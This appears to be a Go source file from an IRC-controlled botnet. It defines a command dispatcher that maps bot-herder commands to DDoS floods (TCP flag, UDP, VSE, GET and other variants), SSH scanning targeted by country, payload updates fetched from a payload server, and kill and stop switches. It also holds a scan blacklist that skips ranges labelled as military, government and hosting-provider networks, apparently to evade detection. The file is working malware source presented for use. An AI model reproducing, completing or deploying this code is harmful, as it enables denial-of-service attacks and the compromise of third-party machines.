package lib

import (
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var BotReader *string

type Bot struct {
	CPU                          int
	payload, newPayload, pServer string //"pServer" = Payload server
	password, network            string
	Channel, ChanKey             string
	BotTag, BotHerder            string
	scanOpt                      string
	scanNetwork                  []string
	isRandom, scanSwitch         bool
	IRC                          net.Conn
	timeout                      time.Duration
	session                      *ssh.Client
}

type Attack struct {
	srcAddr, dstAddr, url                                string
	dstPort                                              string
	httpMethod, reqHeader                                string
	flags                                                string
	reportSwitch, attackSwitch                           bool
	ddosPayload                                          []byte
	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
}

type Caller struct {
	CallAttack *Attack
	CallBot    *Bot
}

var ScanMap = map[string]Bot{
	"-cn": {
		scanNetwork: ChinaNetwork,
		isRandom:    false,
	},
	"-hk": {
		scanNetwork: HongKongNetwork,
		isRandom:    false,
	},
	"-kr": {
		scanNetwork: KoreaNetwork,
		isRandom:    false,
	},
	"-br": {
		scanNetwork: BrazilNetwork,
		isRandom:    false,
	},
	"-r": {
		scanNetwork: RandomNetwork,
		isRandom:    true,
	},
}

var TCPAttackMap = map[string]Attack{
	"-syn": {
		synFlag: true,
	},
	"-ack": {
		ackFlag: true,
	},
	"-rst": {
		rstFlag: true,
	},
	"-psh": {
		pshFlag: true,
	},
	"-fin": {
		finFlag: true,
	},
	"-urg": {
		urgFlag: true,
	},
}

/*
	Blacklist IP that will be skip in random scanning process. Skip since first network ID.
	Some of these first network ID may be anything not mentionally to be the thing that i have commented because i skip since first network ID.
	I don't recommend you to write map like this in Go, i do this because you know...
	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IP.
*/
var BlacklistIP = map[string]struct{}{

	/*
		Loopback
	*/
	"127.": {},

	/*
		General Electric Company
	*/
	"3.": {},

	/*
		Hewlett-Packard Company
	*/
	"15.": {}, "16.": {},

	/*
		US Postal Service
	*/
	"56.": {},

	/*
		Internal network
	*/
	"10.": {}, "192.": {}, "172.": {},

	/*
		NAT
	*/
	"100.": {}, "169.": {},

	/*
		Special use
	*/
	"198.": {},

	/*
		Multicast
	*/
	"224.": {},

	/*
		CIA
	*/
	"162.": {},

	/*
		Cloudflare
	*/
	"104.": {},

	/*
		NASA Kennedy Space Center
	*/
	"163.": {}, "164.": {},

	/*
		Naval Air Systems Command, VA
	*/
	"199.": {},

	/*
		Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
	*/
	"205.": {},

	/*
		FBI controlled Linux servers & IPs/IP-Ranges
	*/
	"207.": {},

	/*
		Amazon + Microsoft
	*/
	"13.": {}, "52.": {}, "54.": {},

	/*
		Ministry of Education Computer Science
	*/
	"120.": {}, "188.": {}, "78.": {},

	/*
		Total Server Solutions
	*/
	"107.": {}, "184.": {}, "206.": {}, "98.": {},

	/*
		Blazingfast & Nforce
	*/
	"63.": {}, "70.": {}, "74.": {},

	/*
		Choopa & Vultr
	*/
	"64.": {}, "185.": {}, "208.": {}, "209.": {}, "45.": {}, "66.": {}, "108.": {}, "216.": {},

	/*
		OVH
	*/
	"149.": {}, "151.": {}, "167.": {}, "176.": {}, "178.": {}, "37.": {}, "46.": {}, "51.": {},
	"5.": {}, "91.": {},

	/*
		Department of Defense
	*/
	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {}, "29.": {},
	"30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
}

func (b *Bot) AccessPerms() bool {
	return Find(Recv(*BotReader, 0), b.BotHerder)
}

func ComdSetup(args int, cut string) string {
	return strings.Trim(Recv(*BotReader, args), cut)
}

func SetupCaller() (Caller, bool) {
	if Find(*BotReader, "?tcp") {
		var CALL_5_ARG = map[string]Caller{
			ComdSetup(3, ":"): {
				CallAttack: &Attack{
					flags:        Recv(*BotReader, 4),
					srcAddr:      Recv(*BotReader, 5),
					dstAddr:      Recv(*BotReader, 6),
					dstPort:      Recv(*BotReader, 7),
					ddosPayload:  sockBuffer(Recv(*BotReader, 8)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_5_ARG[ComdSetup(3, ":")]
		return value, key
	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?paf") || Find(*BotReader, "?xmas") {
		var CALL_4_ARG = map[string]Caller{
			ComdSetup(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_4_ARG[ComdSetup(3, ":")]
		return value, key
	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?scan") || Find(*BotReader, "?update") {
		var CALL_2_ARG = map[string]Caller{
			ComdSetup(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?scan": {
				CallBot: &Bot{
					scanOpt:    Recv(*BotReader, 4),
					pServer:    Recv(*BotReader, 5),
					scanSwitch: false,
				},
			},
			"?update": {
				CallBot: &Bot{
					newPayload: Recv(*BotReader, 4),
					pServer:    Recv(*BotReader, 5),
				},
			},
		}
		value, key := CALL_2_ARG[ComdSetup(3, ":")]
		return value, key
	} else if Find(*BotReader, "?get") || Find(*BotReader, "?poling") {
		var CALL_1_ARG = map[string]Caller{
			ComdSetup(3, ":"): {
				CallAttack: &Attack{
					url:          Recv(*BotReader, 4),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_1_ARG[ComdSetup(3, ":")]
		return value, key
	} else if Find(*BotReader, "?info") || Find(*BotReader, "?kill") || Find(*BotReader, "?stopddos") || Find(*BotReader, "?stopscan") {
		var CALL_NON_ARG = map[string]Caller{
			ComdSetup(3, ":"): {
				CallBot: &Bot{},
			},
			"?stopddos": {
				CallAttack: &Attack{
					attackSwitch: true,
					reportSwitch: true,
				},
			},
			"?stopscan": {
				CallBot: &Bot{
					scanSwitch: true,
				},
			},
		}
		value, key := CALL_NON_ARG[ComdSetup(3, ":")]
		return value, key
	}
	return Caller{}, false
}

func (b *Bot) ExecuteCaller() (func(), bool) {
	var executesCallMap = map[string]func(){
		"?udp":      b.UDP,
		"?tcp":      b.TCP,
		"?saf":      b.SAF,
		"?paf":      b.PAF,
		"?xmas":     b.XMAS,
		"?vse":      b.VSE,
		"?fms":      b.FMS,
		"?ipsec":    b.IPSEC,
		"?get":      b.GET,
		"?poling":   b.POLING,
		"?scan":     b.Scanner,
		"?update":   b.Update,
		"?info":     b.Information,
		"?kill":     Kill,
		"?stopddos": setAttackSwitch,
		"?stopscan": setScanSwitch,
	}
	value, key := executesCallMap[ComdSetup(3, ":")]
	return value, key
}

func FunctionCaller(launch func()) {
	go launch()
}
